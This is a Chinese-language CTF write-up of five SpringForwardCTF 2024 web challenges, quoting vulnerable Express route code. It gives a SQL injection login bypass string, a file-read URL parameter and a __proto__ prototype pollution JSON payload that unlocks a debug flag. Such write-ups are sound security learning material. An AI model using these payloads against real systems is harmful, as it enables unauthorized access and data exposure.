---
title: "I don't want to be a sacrifice! - SpringForwardCTF"
category: "web"
subcategory: "prototype-pollution"
type: "writeup"
tags: ["web", "prototype-pollution", "don", "want", "sacrifice", "springforwardctf", "ctf-writeup"]
summary: "第一个框的按钮调用的是mirror()方法，跟进一下"
source:
  name: "CTFtime writeup #39117"
  url: "https://ctftime.org/writeup/39117"
original_source: "https://j-0k3r.github.io/2024/04/28/SpringForwardCTF2024web/"
ctf:
  name: "SpringForwardCTF"
  challenge: "I don't want to be a sacrifice!"
---

## Metadata

- **CTF:** SpringForwardCTF
- **Task:** I don't want to be a sacrifice!
- **Author team:** Hor1zon
- **CTFtime tags:** web
- **CTFtime:** <https://ctftime.org/writeup/39117>
- **Original writeup:** <https://j-0k3r.github.io/2024/04/28/SpringForwardCTF2024web/>

---
# SpringForwardCTF2024 web

本文最后更新于 2024年4月29日 晚上 

## Socratic-Script

上传发现弹窗  
![image.png](https://j-0k3r.github.io/mdimg/SpringForwardCTF2024/1714364709875-d3ed1a82-98a7-4f9d-9aab-4cc177e0cce4.png)  
![image.png](https://j-0k3r.github.io/mdimg/SpringForwardCTF2024/1714364808819-20b85bdc-c424-4335-a41e-682c865febd5.png)  
禁用js就行了  
把题目给的附件txt上传就行了  
![image.png](https://j-0k3r.github.io/mdimg/SpringForwardCTF2024/1714364895685-75d349fc-048c-4ad4-b682-240080cf8076.png)

## Into-the-Gorgons’-Den

看源码  
![image.png](https://j-0k3r.github.io/mdimg/SpringForwardCTF2024/1714365145231-d9c92c75-3efd-47d1-a95e-f8128323457e.png)  
得到第三部分flag：`_g0rg0n}`  
![image.png](https://j-0k3r.github.io/mdimg/SpringForwardCTF2024/1714365339177-1891f557-465d-4617-a445-59dc1c39faed.png)  
第一个框的按钮调用的是`mirror()`方法，跟进一下  
![image.png](https://j-0k3r.github.io/mdimg/SpringForwardCTF2024/1714365417532-a6b928e0-d03f-46b4-8836-cf79ef14f389.png)  
输入`suesrep`返回`Medusa's weakness is her reflection! She will turn her gaze at the 30th minute minus 2.`美杜莎的弱点是她的倒影！她将把目光转向第 30 分钟减去 2。  
等到28分  
![1714369463656.jpg](https://j-0k3r.github.io/mdimg/SpringForwardCTF2024/1714369510753-7b08e540-b2ed-4e63-9e7f-336550446664.jpeg)  
页面下面有段密文![image.png](https://j-0k3r.github.io/mdimg/SpringForwardCTF2024/1714365618959-9f536ffc-fd55-489a-a544-c008b777dd2d.png)  
![image.png](https://j-0k3r.github.io/mdimg/SpringForwardCTF2024/1714365569762-3d660425-2016-4b83-8c7f-923a3d7f3c61.png)  
这句话的意思是第二部分的flag是`th3`  
最终  
`nicc{sl4y_th3_g0rg0n}`

## back-in-time

进去一登录框  
![image.png](https://j-0k3r.github.io/mdimg/SpringForwardCTF2024/1714369675056-7814635f-23bc-4e02-90e5-8bda33d3fa32.png)  
有注入  
直接 `admin ` `1"or"1"="1` 就登进去了  
查看源码得到`<!-- back-in-time flag part 1 of 3: "nicc{nBUE2hG" -->`  
在`/[travel](http://34.207.63.151/travel)`路由源码得到 `<!-- back-in-time flag part 2 of 3: "meTQRbL" -->`  
访问`/status`路由时  
![image.png](https://j-0k3r.github.io/mdimg/SpringForwardCTF2024/1714369991939-ccf33798-2075-4d42-b6bf-d2db325d6646.png)  
`nicc{nBUE2hGmeTQRbLcijueiF}`

## Underworld-Bypass

描述：

> Cast into the inferno’s depths, souls languish in perpetual torment, with no reprieve from the hellfire’s embrace. Yet whispers endure of a realm_key, a legendary artifact able to traverse the boundaries between worlds, offering a glimmer of salvation. The question that burns as fiercely as the flames themselves: do you possess the courage to seek it? Find flag.txt and submit the flag in the format flag nicc{flag}

flag在flag.txt  
hint：`The Keeper's Riddle last line`  
![image.png](https://j-0k3r.github.io/mdimg/SpringForwardCTF2024/1714370604582-8b7dd133-9e63-4983-9670-94698ee3e526.png)  
发现文件读取  
`/explore.php?file=/realm_key/flag.txt`  
![image.png](https://j-0k3r.github.io/mdimg/SpringForwardCTF2024/1714370659167-663e375b-191c-4ca7-8344-cd911fe03e9a.png)

## back-in-time-2-electric-boogaloo

给了源码  
在`/routes/travel.js`找到了flag  
![image.png](https://j-0k3r.github.io/mdimg/SpringForwardCTF2024/1714391845578-05acf8ca-8ae5-41f1-bc97-f4052efd887a.png)

```
    1  
    2  
    3  
    4  
    5  
    6  
    7  
    8  
    9  
    10  
    11  
    12  
    13  
    14  
    15  
    16  
    17  
    18  
    19  
    20  
    21  
    22  
    23  
    24  
    25  
    26  
    27  
    28  
    29  
    30  
    31  
    32  
    33  
    34  
    35  
    36  
    37  
    38  
    39  
    40  
    41  
    42  
    43  
    44  
    45  
    46  
    47  
    48  
    49  
    50  
    51  
    52  
    53  
    54  
    55  
    56  
    57  
    58  
    59  
    60  
    61  
    62  
    63  
    64  
    65  
    66  
    67  
    68  
    69  
    70  
    71  
    72  
    73  
    74  
    75  
    76  
    77  
    78  
    79  
```

| 

```
    import { sqlConnection } from '../app.js';  
    import timeController from '../system-control.js';  
    import { Router } from 'express';  
      
    const timeTravelRouter = Router({ mergeParams: true });  
      
    timeTravelRouter.get('/', async (req, res) => {  
      let results;  
      
      try {  
        [results] = await sqlConnection.execute(  
          'SELECT * FROM leaps ORDER BY leap_id DESC');  
      } catch (error) {  
        results = null;  
      }  
      
      
      let lastTravelDate;  
      if (results && results.length) {  
        const lastTravelEntry = results[0];  
        lastTravelDate = new Date(lastTravelEntry.leap_date);  
        lastTravelDate.setFullYear(lastTravelEntry.year);  
      } else {  
        lastTravelDate = new Date('1970-01-01');  
      }  
      
      res.render('travel', {  
        session: req.session,  
        currentDate: new Date(),  
        lastTravelDate: lastTravelDate,  
        destinationDate: timeController({ type: 'GetSetpoint' }),  
      });  
    });  
      
    timeTravelRouter.put('/', async (req, res) => {  
      const request = { type: 'SetSetpoint' };  
      
      if (req.body.debug && !(process.env.ALLOW_USER_DEBUG === 'true')) {  
        return res.json({ error: 'Debug mode is not allowed to be set.' });  
      }  
      
      for (const prop in req.body) {  
        request[prop] = req.body[prop];  
      }  
      
      const date = new Date(req.body.date);  
      let year = req.body.year;  
      if (req.body.bc)  
        year = year * -1;  
      date.setFullYear(year);  
      try {  
        timeController(request);  
        if (request.debug) {  
          return res.json({ success: true, debugInfo: process.env.FLAG });  
        } else {  
          return res.json({ success: true });  
        }  
      } catch (err) {  
        res.status(500);  
        if (request.debug) {  
          return res.json({ error: err.message, debugInfo: process.env.FLAG });  
        } else {  
          return res.json({ error: err.message });  
        }  
      }  
      
    });  
    timeTravelRouter.post('/', async (_req, res) => {  
      try {  
        timeController({ type: 'TimeTravel' });  
        return res.json({ success: true });  
      } catch (err) {  
        res.status(500);  
        return res.json({ error: err.message });  
      }  
    });  
      
    export default timeTravelRouter;  
```  
  
---|---

```
    1  
    2  
    3  
    4  
    5  
```  
  
| 

```
    if (request.debug) {  
          return res.json({ success: true, debugInfo: process.env.FLAG });  
        } else {  
          return res.json({ success: true });  
        }  
```  
  
---|---  
  
要`request.debug==true`就返回flag 看上去能用原型链污染  
在web页面登录后（和第一题一样登录）  
![image.png](https://j-0k3r.github.io/mdimg/SpringForwardCTF2024/1714392310312-494debad-000d-4eb9-b22b-723e81780812.png)  
![image.png](https://j-0k3r.github.io/mdimg/SpringForwardCTF2024/1714392354174-30108409-5dae-483c-bec6-436956b8e4d0.png)  
加上debug参数  
![image.png](https://j-0k3r.github.io/mdimg/SpringForwardCTF2024/1714392415129-a5c6ac79-0eed-4104-b6f8-38ffc54113b5.png)  
这里触发了

```
    1  
    2  
    3  
```

| 

```
    if (req.body.debug && !(process.env.ALLOW_USER_DEBUG === 'true')) {  
        return res.json({ error: 'Debug mode is not allowed to be set.' });  
      }  
```  
  
---|---  
  
接着下一行

```
    1  
    2  
    3  
```

| 

```
    for (const prop in req.body) {  
      request[prop] = req.body[prop];  
    }  
```  
  
---|---  
  
把请求的属性和值都给了request对象，包括原型链上的属性  
传入

```
    1  
    2  
    3  
    4  
    5  
    6  
    7  
    8  
```

| 

```
    {   
      "date": "2024-04-27",   
      "year": "1945",  
      "bc": true ,  
      "__proto__": {  
        "debug": true  
      }  
    }  
```  
  
---|---  
  
在`if (req.body.debug && !(process.env.ALLOW_USER_DEBUG === 'true'))`时不会读取原型链__proto__属性，所以这里`req.body.debug`不为true，绕过了if  
而接着经过`for (const prop in req.body)`的遍历  
读取了原型链__proto__属性并给了request对象，所以`if (request.debug)`为true，返回flag  
![image.png](https://j-0k3r.github.io/mdimg/SpringForwardCTF2024/1714394549477-f9fc4651-23d7-4948-809f-b1b5b95f6c94.png)

* * *

__ [CTF](https://j-0k3r.github.io/categories/CTF/) > [比赛Write Up](https://j-0k3r.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWrite-Up/)

__[#比赛Write Up](https://j-0k3r.github.io/tags/%E6%AF%94%E8%B5%9BWrite-Up/)

SpringForwardCTF2024 web

http://example.com/2024/04/28/SpringForwardCTF2024web/

作者

J_0k3r

发布于

2024年4月28日

许可协议

BY J_0K3R 

[ __ 2024数据安全产业人才积分争夺赛初赛wp 上一篇 ](https://j-0k3r.github.io/2024/04/29/2024%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/ "2024数据安全产业人才积分争夺赛初赛wp") [ 第九届中国海洋大学信息安全竞赛 下一篇 __](https://j-0k3r.github.io/2024/04/27/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/ "第九届中国海洋大学信息安全竞赛")
